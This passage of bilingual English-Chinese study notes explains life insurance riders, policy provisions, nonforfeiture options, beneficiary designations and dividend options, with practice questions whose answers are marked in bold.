(GIO).</li><li>使投保人有权在保单有效期内的指定选择日期（通常每三年一次）购买与基本人寿保险单相同类型的额外保险，但无需提供被保险人可保性的证据。也称为保证可保性选项（GIO）。</li><li>作用： 提供了被保险人在未来某些特定时点购买更多寿险保额的权利，而无需进行健康检查或提供医疗证明<ul><li>如果保单所有者在期权日期跳过购买额外的保险，那么这个特定的机会就永远失去了。投保人仍然可以在下一个选择日购买额外的保险。选择权通常在40岁时结束。</li></ul></li></ul></li><li>Paid-up additions option benefit 额外付费追加保险受益<ul><li>allows the owner of a whole life insurance policy to purchase single-premium paid-up additions to the policy on stated dates in the future without providing evidence of the insured’s insurability.</li><li>允许终身保险单的所有人在未来规定的日期购买单笔已缴保费的附加保险，而无需提供被保险人可保性的证据。</li><li>作用： 允许被保险人将现金价值投资为额外的已付增额，提高保单的现金价值和死亡福利。</li><li>已付增额是指被保险人可以使用保单的红利（surplus）或现金价值（cash value）购买的附加寿险金额。选择购买已付增额通常是在选择日期（option date）进行的，但这并不是自动发生的。被保险人通常需要主动选择购买已付增额，而不是由保险公司自动执行。已付增额的保费基于 <strong>被保险人</strong> 购买时的年龄。</li></ul></li></ul><h2 id="课后习题"><a href="#课后习题" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.Tonya Fisk is the policyowner of a life insurance policy covering her 10-year-old daughter, Molly. Ms. Fisk recently added a typical waiver of premium for payor benefit to this policy. The following statements are about this situation. Select the answer choice containing the correct statement.</p><ul><li><strong>In order to add the waiver of premium for payor benefit to her policy, Ms. Fisk must have submitted proof of her own insurability.</strong></li><li>The waiver of premium for payor benefit will apply only if Ms. Fisk dies; it does not apply to a situation in which Ms. Fisk becomes totally disabled.</li><li>Ms. Fisk must continue paying premiums on this policy; the waiver of premium for payor benefit will apply until Molly is age 65.</li><li>Ms. Fisk was permitted to add the waiver of premium for payor benefit to her policy because she is both the policyowner and the insured.<blockquote><p>Tonya Fisk是她10岁女儿Molly的人寿保险单的投保人。Fisk女士最近在这项政策中加入了一项典型的豁免保费的规定。以下是关于这种情况的声明。选择包含正确陈述的答案。</p><ul><li>为了在保单中增加对付款人福利的保费豁免，Fisk女士必须提交自己的可保性证明。</li><li>只有在Fisk女士去世的情况下，支付人福利的保费豁免才适用；这不适用于Fisk女士完全残疾的情况。</li><li>Fisk女士必须继续支付该保单的保费；在Molly年满65岁之前，付款人福利的保费豁免将一直有效。</li><li>Fisk女士被允许在她的保单中增加对付款人利益的保费豁免，因为她既是投保人又是被保险人。</li></ul></blockquote></li></ul><p>2.The following statements are about accidental death benefits. Select the answer choice containing the correct statement.</p><ul><li>An accidental death benefit provides a death benefit that is paid instead of the policy’s basic life insurance benefit if the insured person dies in an accident.</li><li>An accidental death benefit is also called a double indemnity benefit because it doubles the premium for the coverage.</li><li>Accidental death benefit provisions rarely contain exclusions.</li><li><strong>An accidental death benefit applies only if an accident is the cause of death.</strong> <blockquote><p>以下声明是关于意外死亡福利的。选择包含正确陈述的答案。</p><ul><li>意外死亡保险金是指如果被保险人在事故中死亡，则支付的死亡保险金，而不是保单的基本人寿保险金。</li><li>意外死亡保险金也被称为双重赔偿保险金，因为它使保险费翻倍。</li><li>意外死亡抚恤金条款很少包含除外条款。</li><li>意外死亡抚恤金仅适用于事故导致死亡的情况。</li></ul></blockquote></li></ul><p>3.Van Reid was the policyowner-insured of a \$250,000 life insurance policy that included a typical accidental death and dismemberment (AD&amp;D) benefit rider. The rider provided an AD&amp;D benefit of \$125,000. While his policy was in force, Mr. Reid was in an accident that resulted in the loss of his sight in both eyes. In this situation, the AD&amp;D benefit rider most likely provided Mr. Reid with a benefit of</p><ul><li>$0</li><li><strong>$125,000</strong> </li><li>$250,000</li><li>$375,000<blockquote><p>Van Reid是一份价值250000美元的人寿保险的投保人，其中包括一份典型的意外死亡和肢解（AD&amp;D）福利附加条款。该附加条款提供了125000美元的AD&amp;D福利。在他的政策生效期间，里德发生了一起事故，导致双眼失明。在这种情况下，AD&amp;D福利附加条款很可能为Reid先生提供了</p><ul><li>0美元</li><li>125000美元</li><li>250000美元</li><li>375000美元</li></ul></blockquote></li></ul><p>4.The most common type of accelerated death benefit is the terminal illness (TI) benefit. If the policyowner exercises the policy’s TI benefit, this action ( **reduces ** &#x2F; does not reduce) the death benefit that will be paid to the beneficiary. A TI benefit is usually paid in a lump sum that is ( **25 to 75% ** &#x2F; 80 to 95%) of the policy’s face amount.</p><blockquote><p>最常见的加速死亡福利是绝症（TI）福利。如果投保人行使保单的TI福利，则该行为（减少&#x2F;不减少）将支付给受益人的死亡福利。TI福利通常是一次性支付的，即保单票面金额的（25%至75%&#x2F;80至95%）。</p></blockquote><p>5.One type of accelerated death benefit is the dread disease (DD) benefit. Examples of diseases or medical procedures that typically qualify for a DD benefit include<br>    A. Life-threatening cancer<br>    B. Multiple sclerosis<br>    C. Diabetes<br>    D. End-stage kidney failure</p><ul><li>A, B, C, and D</li><li>A, B,and C only</li><li><strong>A and D only</strong> </li><li>D only<blockquote><p>加速死亡福利的一种类型是恐惧症（DD）福利。通常有资格获得DD福利的疾病或医疗程序的例子包括<br>   A.终身治疗癌症<br>   B.多发性硬化症<br>   C.糖尿病<br>   D.终末期肾衰竭</p><ul><li>A、B、C和D</li><li>仅限A、B和C</li><li>仅限A和D</li><li>仅D</li></ul></blockquote></li></ul><p>6.Jun Lin purchased a \$100,000 whole life insurance policy that allows her to purchase up to 10 coverage units of term insurance under a spouse and children’s insurance rider. Ms. Lin wishes to purchase term insurance for her husband, Bai, and their 6-year-old daughter, Nuo. From the answer choices below, select the response that correctly indicates the maximum amount of term insurance that Ms. Lin can purchase for her husband and her daughter.<br>Bai &#x2F; Nuo</p><ul><li>$10,000  $10,000</li><li>$10,000  $50,000</li><li>$50,000  $50,000</li><li><strong>$50,000  $10,000</strong> <blockquote><p>Jun Lin购买了一份价值10万美元的终身保险，允许她在配偶和子女保险附加条款下购买最多10个保险单位的定期保险。林希望为丈夫白和他们6岁的女儿诺购买定期保险。从下面的答案中，选择正确显示林女士可以为丈夫和女儿购买定期保险最高金额的答案。<br>白&#x2F;诺</p><ul><li>10000美元  10000美元</li><li>10000美元  50000美元</li><li>50000美元  50000美元</li><li>50000美元  10000美元</li></ul></blockquote></li></ul><p>7.The following statement(s) can correctly be made about a children’s insurance rider and a second insured rider:<br>    A. Under a children’s insurance rider, the premium amount charged for each coverage unit varies with the number of children covered and their ages.<br>    B. Under a second insured rider, the coverage amount for the second insured is not related to the primary policy coverage.</p><ul><li>Both A and B</li><li>A only</li><li><strong>B only</strong> </li><li>Neither A nor B<blockquote><p>关于儿童保险附加条款和第二个被保险附加条款，可以正确地做出以下声明：<br>A.根据儿童保险附加条款，每个保险单位的保费金额因投保儿童的数量和年龄而异。<br>B.根据第二个被保险人附加条款，第二个保险人的保险金额与主要保险范围无关。</p><ul><li>A和B</li><li>仅A</li><li>仅限B</li><li>既不是A也不是B</li></ul></blockquote></li></ul><p>8.Maya Orton, age 28, is the policyowner-insured of a $100,000 whole life insurance policy. Ms. Orton’s policy contains a typical guaranteed insurability (GI) rider. One true statement about this situation is that Ms. Orton</p><ul><li>did not have to pay an additional premium for this benefit</li><li>will be able to exercise the GI option in her policy until she reaches age 65</li><li>must exercise the GI rider on every option date or else the GI rider will be canceled</li><li><strong>will not have to submit evidence of insurability any time she exercises the GI option</strong><blockquote><p>Maya Orton，28岁，是一份价值10万美元的终身保险的投保人。奥尔顿女士的保单包含一个典型的保证可保性（GI）附加条款。关于这种情况的一个真实陈述是奥尔顿女士</p><ul><li>无需为此福利支付额外保费</li><li>将能够在65岁之前行使保单中的GI选项</li><li>必须在每个选项日期行使GI附加条款，否则GI附加条款将被取消</li><li>在她行使GI选项的任何时候都不必提交可保性的证据</li></ul></blockquote></li></ul><p>9.The following statement(s) can correctly be made about the insurability benefit rider known as the paid-up additions option benefit:<br>    A. Paid-up additions have a cash value.<br>    B. Premiums for paid-up additions are based on the insured’s age at the time of purchase.<br>    C. Paid-up additions are purchased automatically on each option date.<br>    D. The policyowner does not need to provide evidence of the insured’s insurability.</p><ul><li>A, B, C, and D</li><li><strong>A, B,and D only</strong> </li><li>A and C only</li><li>B and D only</li><li>C only<blockquote><p>以下声明可以正确地说明被称为“已付清附加选项”的可保性福利附加条款：<br>   A.实收增值具有现金价值。<br>   B.已付清附加费的保险费以被保险人购买时的年龄为基础。<br>   C.在每个期权日期自动购买已付清的附加款。<br>   D.投保人不需要提供被保险人可保性的证据。</p><ul><li>A、B、C和D</li><li>仅限A、B和D</li><li>仅限A和C</li><li>仅限B和D</li><li>仅C</li></ul></blockquote></li></ul><h1 id="Lesson-2"><a href="#Lesson-2" class="headerlink" title="Lesson 2"></a>Lesson 2</h1><h2 id="Life-Insurance-Policy-Provisions【人寿保险单条款】"><a href="#Life-Insurance-Policy-Provisions【人寿保险单条款】" class="headerlink" title="Life Insurance Policy Provisions【人寿保险单条款】"></a>Life Insurance Policy Provisions【人寿保险单条款】</h2><p> <strong>Entire Contract Provision</strong>: prevents oral statements or other documents not identified in the entire contract provision from being used to challenge the terms of the contractual agreement.<br>全文合同条款：防止口头陈述或在全文合同条款中未标明的其他文件被用来挑战合同协议的条款。</p><p> <strong>Closed contract</strong>: only terms printed in or attached to the contract are part of the contract. 只有在合同中打印或附加的条款才属于合同的一部分。<br> <strong>Open contract</strong>: documents that are considered part of the contract are not all attached to it. 被视为合同一部分的文件并非全部附加在合同上。</p><p>Documents that make up the entire contract for a life insurance policy:  构成寿险保单整体的文件</p><ul><li>Closed contract life insurance policy 封闭合同寿险保单<ul><li>Insurance policy 保险单</li><li>Policy riders 保单附加条款</li><li>Application for insurance 保险申请</li></ul></li><li>Open contract life insurance policy 开放合同寿险保单<ul><li>Insurance policy 保险单</li><li>Policy riders 保单附加条款</li><li>Membership application 会员申请</li><li>Declaration of insurability 可保证声明</li><li>Fraternal Charter, Constitution, and By-laws 友爱社章程、宪法和章程（加入友爱社时会收到副本，所以并未附加在保单上）</li></ul></li></ul><p>Free-look provision: gives policyowner <strong>10 days</strong> from policy delivery date to examine the policy. During free look:<br>自由期条款：为保单持有人提供自保单交付日期起的10天时间来审查保单。在自由期内：</p><ol><li>Policyowner can cancel for a  **full ** refund of initial premium 保单持有人可以取消并获得初始保费的全额退款。</li><li>Coverage is in effect 保险覆盖生效。</li></ol><h2 id="Incontestability-Provision【不可抗辩条款】"><a href="#Incontestability-Provision【不可抗辩条款】" class="headerlink" title="Incontestability Provision【不可抗辩条款】"></a>Incontestability Provision【不可抗辩条款】</h2><p> <strong>Material Misrepresentation：</strong> 重大虚假陈述<br>If the insurer would not have issued the policy or would have issued the policy on a different basis, such as with a higher premium or lower face amount, had the truth been known, then the misrepresentation is a material misrepresentation.<br>如果保险人在知道真相的情况下不会签发保单，或者会在不同的基础上签发保单，例如更高的保费或更低的票面金额，那么虚假陈述就是重大虚假陈述。</p><p> **Incontestability: **  无可争辩性<br>Insurer will not contest this policy after it has been in force during the lifetime of the insured for two years after the date of issue.<br>本保单自签发之日起在被保险人有效期内有效两年后，保险公司将不会对此提出异议。<br>Including “during the lifetime of the insured” makes the policy contestable forever as long as the insured dies during the contestable period.<br>包括“在被保险人的一生中”使得只要被保险人在可争议期间死亡，保单就永远具有可争议性。</p><h2 id="Grace-Period-and-Reinstatement【宽限期和恢复】"><a href="#Grace-Period-and-Reinstatement【宽限期和恢复】" class="headerlink" title="Grace Period and Reinstatement【宽限期和恢复】"></a>Grace Period and Reinstatement【宽限期和恢复】</h2><p>Grace period provision—Gives the policyowner a stated number of days—typically, 30 or 31—after the renewal premium due date to pay and the policy  <strong>remains in force</strong> .<br>宽限期规定——在续保保费到期日后，给投保人规定的天数，通常为30或31天，保单仍然有效。</p><blockquote><p>for a UL(universal life policy) policy, if the grace period starts when the</p><ul><li>Cash value is less than the mortality and expense charge, then the grace period is 61 or 62 days</li><li>Cash value equals zero, then the grace period is 30 or 31 days</li></ul></blockquote><p> <strong>Reinstatement</strong> : Putting a terminated policy back in force. No new policy.<br> <strong>Reinstatement provision</strong> : Describes the requirements for reinstating a policy.</p><p>恢复旧保单的一些条件</p><ul><li>Original policy usually cannot have been surrendered 原保单通常不能已被解约</li><li>Policy loan must be repaid or reinstated 必须偿还或恢复保单贷款</li><li>Policyowner must Complete the reinstatement application 保单持有人必须完成复效申请</li><li>New contestability period based only on information in reinstatement 基于复效信息设定的新争议期</li><li>Provide new evidence of insurability 提供新的可保证性证据</li><li>Fixed-premium policy—Policyowner must pay all missed premiums plus interest 固定保费保单—保单持有人必须支付所有未付保费以及利息</li><li>Flexible-premium policy—Policyowner must pay the mortality and expense charges for a stated amount of time 灵活的保费政策——保单持有人必须在规定的时间内支付死亡率和费用</li></ul><h2 id="Misstatements【虚假陈述】"><a href="#Misstatements【虚假陈述】" class="headerlink" title="Misstatements【虚假陈述】"></a>Misstatements【虚假陈述】</h2><p>The <strong>misstatement of age or sex provision</strong>  describes how an insurer adjusts the policy benefit if the age or the sex of the insured is incorrectly stated.<br>年龄或性别错误陈述条款描述了保险公司如何调整保单的保险金，如果被保险人的年龄或性别陈述不准确的情况下。</p><p>If discovery of a misstatement occurs  <strong>before</strong>  the insured’s death, the policyowner has the option of either paying—or receiving a refund of—any difference in the premium amount caused by the misstatement.如果在被保险人死亡之前发现了错误陈述，投保人可以选择支付或退还因错误陈述导致的保费金额差异。</p><p>If discovery of a misstatement occurs  **after ** the insured’s death, the insurer adjusts the face amount to the benefit the policy premiums would have purchased for the insured’s correct age or sex.如果在被保险人死亡后发现虚假陈述，保险人会根据被保险人的正确年龄或性别，调整保险费的票面金额。</p><h2 id="Loans-Withdrawals-Nonforfeiture-Options【贷款、提款、不失效选择】"><a href="#Loans-Withdrawals-Nonforfeiture-Options【贷款、提款、不失效选择】" class="headerlink" title="Loans, Withdrawals, Nonforfeiture Options【贷款、提款、不失效选择】"></a>Loans, Withdrawals, Nonforfeiture Options【贷款、提款、不失效选择】</h2><p>Features of  <strong>Policy Loans</strong> :</p><ul><li>Only applicable to cash value policies  仅适用于现金价值型保单</li><li>The insurer does not do a credit check  保险公司不进行信用检查</li><li>The insurer charges interest, usually annually  保险公司通常会收取利息，通常是每年一次</li><li>The interest rate may be fixed or may vary with economic conditions (often guaranteed not to be more than a stated maximum rate) 利率可能是固定的，也可能随着经济状况变化（通常保证不超过规定的最高利率）</li><li>No repayment schedule for policy loan balance or accrued interest  对于保单贷款余额或应计利息没有偿还计划</li><li>The insurer subtracts any outstanding loan balance plus accrued interest from the death benefit or cash surrender value 保险公司会从死亡保险金或现金赎回价值中扣除任何未偿还的贷款余额和应计利息</li></ul><hr><p><strong>A policy withdrawal provision</strong> allows the owner of a universal life policy to withdraw up to the amount of the cash value of the policy.<br>保单提取条款允许万能寿险保单的持有人提取高达保单现金价值的金额。</p><ul><li>No interest charged  不收取利息</li><li>Cash value is reduced by the amount of the withdrawal  提取金额将减少现金价值</li><li>Withdrawal fee may be charged  可能会收取提取费用</li><li>Number of withdrawals each year may be limited  每年的提取次数可能会受到限制</li></ul><p><strong>nonforfeiture provision</strong>—provides options to owner of cash value policy if policy lapses or policyowner decides to surrender or terminate policy.<br>不失效条款 - 在保单失效或保单持有人决定投降或终止保单时，为现金价值保单的持有人提供选择的条款。</p><p>The amount of cash value available to the policyowner when coverage terminates is the <strong>net cash surrender value</strong>.<br>当保险覆盖终止时，保单持有人可以获得的现金价值金额被称为净现金赎回价值。<br>Insurers calculate the net cash surrender value by adjusting the cash value as follows:</p><ul><li>The cash value of any paid-up additions  任何已付的额外保费的现金价值</li><li>Any premiums paid in advance  预付的任何保费</li><li>Any accumulated policy dividends  积累的任何保单红利</li><li>Minus any policy loans and policy loan interest outstanding  减去任何未偿还的保单贷款和保单贷款利息。</li></ul><hr><p>The <strong>reduced paid-up insurance nonforfeiture option</strong> allows the policyowner to discontinue paying premiums and use the policy’s net cash surrender value to purchase paid-up life insurance of the same plan as the original policy.<br>减少已付保险金不失效选择允许保单持有人停止支付保费，并利用保单的净现金赎回价值购买与原保单相同计划的已付寿险。</p><p>The <strong>extended term life insurance nonforfeiture option</strong> allows the policyowner to discontinue paying premiums and use the policy’s net cash surrender value to purchase term insurance. This term insurance is for the full coverage amount provided under the original policy for as long a term as the net cash surrender value can provide.<br>延长期寿险不失效选择允许保单持有人停止支付保费，并利用保单的净现金赎回价值购买定期寿险。这种定期寿险的保险期限为净现金赎回价值可以提供的整个原始保单提供的保险金额的期限。</p><p>Many cash value policies also include an <strong>automatic premium loan option</strong>. The insurer will automatically pay an overdue premium by making a loan against the policy’s cash value, as long as the cash value equals or exceeds the amount of premium due.<br>许多现金价值保单还包括自动保费贷款选项。只要现金价值等于或超过到期保险费，保险公司就会以保单的现金价值为抵押，自动支付逾期保险费。</p><ul><li>suicide exclusion provision:<ul><li>If suicide occurs during the exclusion period, the insurer pays no death benefit but does refund the premiums paid. If suicide occurs after the exclusion period, the insurer pays the policy’s full death benefit. 如果在排除期内发生自杀，保险公司不支付死亡保险金，但退还已支付的保费。如果在排除期之后发生自杀，保险公司将支付保单的全部死亡保险金。</li></ul></li><li>War exclusion clauses—proceeds not paid if death results from war  战争除外条款——如果战争导致死亡，则不支付收益</li><li>Hazardous activities exclusion provisions—proceeds not paid if death resulted from specific dangerous activities, such as sky diving or scuba diving  危险活动除外条款——如果死亡是由特定的危险活动造成的，如跳伞或水肺潜水，则不支付收益</li><li>Aviation exclusion provisions—proceeds not paid if death resulted from aviation-related activities 航空除外条款——如果死亡是由航空相关活动造成的，则不支付收益</li></ul><h2 id="课后习题-1"><a href="#课后习题-1" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.Attached to a particular life insurance policy are an accidental death benefit rider and the policy’s application for coverage. The policy contains a typical entire contract provision. Assuming that this policy is a closed contract, the entire insurance contract consists of the</p><ul><li><strong>policy, the accidental death benefit rider, and the application</strong> </li><li>policy and the accidental death benefit rider only</li><li>policy and the application only</li><li>policy only<blockquote><p>附加在特定人寿保险单上的是意外死亡保险金附加条款和保单的保险申请。该政策包含典型的完整合同条款。假设此保单是一个封闭合同，则整个保险合同由</p><ul><li>保单、意外死亡保险附加条款及其应用</li><li>保单和意外死亡保险附加条款</li><li>仅限策略和应用程序</li><li>仅限保单</li></ul></blockquote></li></ul><p>2.Eight days ago, Lupe Diaz purchased a life insurance policy that contains a typical free-look provision. Now, Ms. Diaz has decided that she does not want this coverage. In accordance with the free-look provision in her policy, Ms. Diaz will</p><ul><li><strong>be permitted to cancel her coverage, and she will also receive a full refund of her initial premium</strong> </li><li>be permitted to cancel her coverage, but she will not receive a full refund of her initial premium</li><li>not be permitted to cancel her coverage, because the free-look period of five days has expired</li><li>not be permitted to cancel her coverage, because the free-look period of seven days has expired<blockquote><p>八天前，卢佩·迪亚兹购买了一份人寿保险，其中包含一项典型的免费条款。现在，迪亚兹女士决定，她不想要这种报道。根据其政策中的自由外观条款，迪亚兹女士将</p><ul><li>被允许取消保险，她还将获得初始保费的全额退款</li><li>被允许取消保险，但她将不会获得初始保费的全额退款</li><li>不允许取消她的保险，因为五天的免费试用期已经过期</li><li>不允许取消她的保险，因为七天的免费试用期已经过期</li></ul></blockquote></li></ul><p>3.Lucy Hove was the policyowner-insured of a \$300,000 life insurance policy that contained a typical incontestability provision. In her application for coverage, Ms. Hove had indicated that she did not have heart disease. However, three years after her coverage became effective, Ms. Hove died of a heart attack, and the claim investigator discovered that Ms. Hove had been treated for heart disease prior to applying for her coverage. In the absence of fraud, the insurer in this situation will most likely</p><ul><li>void the contract on the basis of the material misrepresentation in the application</li><li>refund all premiums paid to Ms. Hove’s estate</li><li>refund all premiums paid to the beneficiary of Ms. Hove’s policy</li><li><strong>pay the beneficiary of Ms. Hove’s policy $300,000, because the contestable period has expired</strong> <blockquote><p>Lucy Hove是一份价值300000美元的人寿保险单的投保人，该保单包含典型的不可抗辩条款。霍夫女士在申请保险时表示，她没有心脏病。然而，在她的保险生效三年后，霍夫女士死于心脏病发作，索赔调查员发现霍夫女士在申请保险之前曾接受过心脏病治疗。在没有欺诈的情况下，保险公司在这种情况下很可能</p><ul><li>基于申请中的重大失实陈述而使合同无效</li><li>退还支付给霍夫女士遗产的所有保费</li><li>退还支付给霍夫女士保单受益人的所有保费</li><li>向霍夫女士保单的受益人支付300000美元，因为可竞争期已经到期</li></ul></blockquote></li></ul><p>4.Leah Gill was the policyowner-insured of a $250,000 life insurance policy that contained a 31-day grace period provision. Ms. Gill died during the grace period, before having paid the policy’s renewal premium. In this situation, the beneficiary of Ms. Gill’s policy was most likely entitled to receive</p><ul><li>$0</li><li>a refund of all premiums paid, only</li><li><strong>$250,000, minus the amount of the unpaid renewal premium</strong> </li><li>$250,000<blockquote><p>Leah Gill是一份价值25万美元的人寿保险单的投保人，该保单包含31天的宽限期条款。吉尔女士在宽限期内去世，当时她还没有支付保单的续保费。在这种情况下，吉尔女士保单的受益人很可能有权获得</p><ul><li>0美元</li><li>仅退还已支付的所有保费</li><li>250000美元，减去未支付的续期保险费</li><li>250000美元</li></ul></blockquote></li></ul><p>5.A policyowner who has allowed a life insurance policy to lapse may decide to have the policy reinstated. A life insurance policy usually (can &#x2F; <strong>cannot</strong>) be reinstated if it was surrendered for its cash value. With a reinstatement, the original policy (<strong>is</strong> &#x2F; is not) put back into effect.</p><blockquote><p>允许人寿保险单失效的投保人可以决定恢复保单。如果人寿保险单因其现金价值而被放弃，通常（可以&#x2F;不能）恢复。恢复后，原来的保单（正在&#x2F;没有）重新生效。</p></blockquote><p>6.Carla Sym was the policyowner-insured of a $100,000 whole life insurance policy issued by the Linden Insurance Company. The application listed Ms. Sym’s age as 51. While processing the claim following Ms. Sym’s death, Linden discovered that Ms. Sym was actually 41 when she purchased the policy. Linden determined that premium amount charged was incorrect based on Ms. Sym’s true age. To account for the misstatement of Ms. Sym’s age, Linden most likely will</p><ul><li>reduce the policy’s face amount to the amount that the premiums paid would have purchased for a female insured age 41</li><li><strong>raise the policy’s face amount to the amount that the premiums paid would have purchased for a female insured age 41</strong> </li><li>pay the policy benefit and refund the amount of the additional premium to the beneficiary</li><li>void the policy on the basis of the misstatement of Ms. Sym’s age<blockquote><p>Carla Sym是由Linden Insurance Company发行的一份价值10万美元的终身保险单的被保人和投保人。保单上标明Sym女士51岁。在处理Sym女士去世后的理赔时，Linden发现Sym女士购买保单时实际年龄是41岁。Linden认定根据Sym女士的真实年龄，收取的保费金额是错误的。为了纠正Sym女士年龄的错误陈述，Linden最有可能会做出以下决定：</p><ul><li>将保单的面值减少到以41岁女性投保人的保费支付所购买的金额</li><li>将保单的面值提高到以41岁女性投保人的保费支付所购买的金额</li><li>支付保单的保险金，并将额外的保费金额返还给受益人</li><li>根据Sym女士年龄的错误陈述作为依据，作废保单</li></ul></blockquote></li></ul><p>7.One true statement about a typical policy loan provision is that it</p><ul><li>applies to both term life insurance policies and cash value life insurance policies</li><li><strong>is actually an advance payment of part of the amount that the insurer must eventually pay out under the policy</strong> </li><li>allows a policyowner to borrow up to the face amount of the policy, less one year’s interest on the loan</li><li>requires the insurer to perform a credit check on the policyowner before a loan is approved<blockquote><p>关于典型保单贷款条款的一个正确说明是：</p><ul><li>适用于终身寿险和现金价值寿险两种保单</li><li>实际上是提前支付了保险人在保单项下最终必须支付的部分金额</li><li>允许投保人借款最高金额为保单的面值减去贷款利息一年的金额</li><li>要求保险人在批准贷款之前对投保人进行信用检查</li></ul></blockquote></li></ul><p>8.Delia Sprew has decided to exercise the reduced paid-up insurance nonforfeiture option in her $200,000 cash value life insurance policy. This information indicates that the net cash surrender value of Ms. Sprew’s policy will be</p><ul><li>paid to Ms. Sprew in a lump sum</li><li>used to pay an overdue premium</li><li>used to purchase $200,000 of term life insurance for as long a term as the cash value supports</li><li><strong>used to purchase paid-up life insurance of the same type as Ms. Sprew’s original policy</strong> <blockquote><p>戴莉娅·斯普鲁决定行使她价值20万美元的现金价值寿险保单中的降低已交保费保险的不失约权利。根据这个信息，斯普鲁女士保单的净现金赎回价值将被用于：</p><ul><li>一次性支付给斯普鲁女士</li><li>用于支付逾期保费</li><li>用于购买以现金价值支持的期限尽可能长的价值20万美元的定期寿险</li><li>用于购买与斯普鲁女士原保单相同类型的无需继续交费的寿险</li></ul></blockquote></li></ul><p>9.Ed Blount was the policyowner-insured of a $500,000 cash value life insurance policy that contained a typical suicide exclusion provision. Three years after Mr. Blount purchased his policy, he committed suicide. At the time of Mr. Blount’s death, his policy had a cash value of $10,000. In this situation, the beneficiary of Mr. Blount’s policy was most likely entitled to receive</p><ul><li>$0</li><li>a refund of the policy premiums only</li><li>$10,000</li><li><strong>$500,000</strong><blockquote><p>埃德·布朗特是一份价值500,000美元的现金价值寿险保单的投保人和被保险人，该保单包含了典型的自杀豁免条款。在布朗特先生购买保单三年后，他自杀身亡。在布朗特先生去世时，他的保单现金价值为10,000美元。在这种情况下，布朗特先生的保单受益人最有可能有权获得：</p><ul><li>$0</li><li>仅退还保单的保费</li><li>$10,000</li><li>$500,000</li></ul></blockquote></li></ul><h1 id="Lesson-3"><a href="#Lesson-3" class="headerlink" title="Lesson 3"></a>Lesson 3</h1><h2 id="Policy-Ownership-Rights【保单所有权】"><a href="#Policy-Ownership-Rights【保单所有权】" class="headerlink" title="Policy Ownership Rights【保单所有权】"></a>Policy Ownership Rights【保单所有权】</h2><ul><li>Real property is land and whatever’s attached to the land. 不动产是指土地和附着在土地上的任何东西。</li><li>Personal property is all property other than real property. 个人财产是不动产以外的所有财产。<ul><li>can be classified as tangible or intangible 个人财产可分为有形财产或无形财产。（根据物理形式或者合法权利）</li><li>A life insurance policy is intangible personal property. 人寿保险单是无形的个人财产。</li></ul></li></ul><p>Beneficiaries are either primary beneficiaries or contingent beneficiaries. Contingent beneficiaries receive policy proceeds only if all primary beneficiaries predecease the insured.<br>受益人要么是主要受益人，要么是或有受益人。或有受益人只有在所有主要受益人先于被保险人死亡的情况下才能获得保单收益。</p><p>The policyowner receives the proceeds if no beneficiary survives the insured’s death; if the policyowner is deceased, proceeds go to policyowner’s estate.<br>如果被保险人死亡后没有受益人幸存，投保人将获得收益；如果投保人死亡，收益将归投保人的遗产所有。</p><h2 id="Revocable-and-Irrevocable-Beneficiaries【可撤销和不可撤销的受益人】"><a href="#Revocable-and-Irrevocable-Beneficiaries【可撤销和不可撤销的受益人】" class="headerlink" title="Revocable and Irrevocable Beneficiaries【可撤销和不可撤销的受益人】"></a>Revocable and Irrevocable Beneficiaries【可撤销和不可撤销的受益人】</h2><p>Life insurance policies usually give the policyowner an unlimited right to change the beneficiary designation at any time during the insured’s lifetime. This right is known as the <strong>right of revocation</strong>.<br>人寿保险单通常赋予投保人在被保险人一生中的任何时候更改受益人指定的无限权利。这项权利被称为撤销权。</p><p>Most beneficiaries have no right to the policy proceeds while the insured is alive and are known as <strong>revocable beneficiaries</strong>.<br>大多数受益人在被保险人活着时无权获得保单收益，被称为可撤销受益人。</p><p>If a policyowner makes an irrevocable beneficiary designation, the policyowner usually can’t change the beneficiary or exercise other ownership rights.<br>如果保单持有人会指定不可撤销的受益人，未经受益人同意，投保人通常不能更改受益人或行使其他所有权。</p><p>A revocable beneficiary has a “ <strong>mere expectancy</strong> “ of receiving the policy proceeds.<br>可撤销受益人“仅仅期望”获得保单收益</p><p>If an irrevocable beneficiary dies before the insured, then the <strong>beneficiary’s vested</strong> interest ends and the policyowner can name a new beneficiary.<br>如果不可撤销的受益人先于被保险人死亡，那么受益人的既得利益终止，投保人可以指定新的受益人。</p><h2 id="Premiums-and-Policy-Dividends【保费和保单红利】"><a href="#Premiums-and-Policy-Dividends【保费和保单红利】" class="headerlink" title="Premiums and Policy Dividends【保费和保单红利】"></a>Premiums and Policy Dividends【保费和保单红利】</h2><p>Insurers typically offer these payment modes:</p><ol><li>Annually</li><li>Semiannually</li><li>Quarterly</li><li>Monthly</li></ol><p>The owner of a participating policy can share in the insurance company’s profitable operations by receiving a portion of its divisible surplus.<br>参与保单的所有者可以通过获得保险公司可分割盈余的一部分来分享保险公司的盈利业务。未参与保险的保单持有人则无权分享。<br>An insurer shares its divisible surplus through policy dividends, which are essentially premium refunds, not taxable income like stock dividends are.<br>保险公司通过保单股息分享其可分割盈余，保单股息本质上是保费退款，而不是像股票股息那样的应税收入。</p><p>Mostly, the names of the policy dividend options describe each option well. 大多数情况下，保单股息期权的名称很好地描述了每一种期权：</p><ul><li>Cash dividend option–Insurer sends a check to the policyowner.<ul><li>现金红利选项 - 保险公司向投保人寄发支票。</li></ul></li><li>Premium reduction dividend option–Insurer applies a policy dividend toward premium payments<ul><li>保费减免红利选项 - 保险公司将保单红利用于支付保费。</li></ul></li><li>Policy loan repayment dividend option–Insurer applies a policy dividend toward the repayment of outstanding policy loan<ul><li>贷款偿还红利选项 - 保险公司将保单红利用于偿还未偿还的保单贷款。</li></ul></li><li>Accumulation at interest dividend option–Insurer keeps a policy dividend on deposit earning interest<ul><li>利息积累红利选项 - 保险公司将保单红利存入带息账户中。</li></ul></li><li>Paid-up additional insurance dividend option–Policy dividend used to purchase additional coverage of the same type as the basic policy<ul><li>增额已交保费红利选项 - 利用保单红利购买额外的与基本保单相同类型的保险。 <strong>默认选项</strong></li></ul></li><li>Additional term insurance dividend option–Policy dividend used as a net single premium to purchase one-year term insurance<ul><li>额外期限保险红利选项 - 利用保单红利购买一年期的期限保险净单期保费。</li></ul></li></ul><h2 id="Settlement-Options-and-Ownership-Transfer【结算选择权和所有权转让】"><a href="#Settlement-Options-and-Ownership-Transfer【结算选择权和所有权转让】" class="headerlink" title="Settlement Options and Ownership Transfer【结算选择权和所有权转让】"></a>Settlement Options and Ownership Transfer【结算选择权和所有权转让】</h2><p>The policyowner may select a settlement option for the beneficiary and can make that choice revocable or irrevocable. Unless the 